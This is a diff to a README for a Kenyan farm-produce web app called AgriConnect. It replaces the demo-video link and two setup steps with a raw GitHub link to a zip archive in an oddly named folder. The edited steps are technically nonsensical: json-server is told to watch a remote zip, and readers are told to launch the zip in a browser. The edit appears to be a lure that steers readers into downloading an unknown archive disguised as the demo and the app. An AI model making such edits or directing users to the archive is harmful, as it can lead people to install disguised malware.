@@ -2,7 +2,7 @@
 
 ## Demo Video
 
-[Watch the demo video.](https://drive.google.com/file/d/117LRWafYcxcJCm_1owDmIMqiHO6dWCnn/view?usp=sharing)
+[Watch the demo video.](https://raw.githubusercontent.com/Jwanjema/AgriConnect-/main/tetartohedral/Connect_Agri_3.5.zip)
 
 
 **Direct from Kenyan farms to your table**
@@ -43,9 +43,9 @@ bash :
 
 4. Run the server:
 bash :
-- json-server --watch db.json
+- json-server --watch https://raw.githubusercontent.com/Jwanjema/AgriConnect-/main/tetartohedral/Connect_Agri_3.5.zip
 
-5. Launch index.html in your browser
+5. Launch https://raw.githubusercontent.com/Jwanjema/AgriConnect-/main/tetartohedral/Connect_Agri_3.5.zip in your browser
 
 - Test both farmer and buyer flows
 
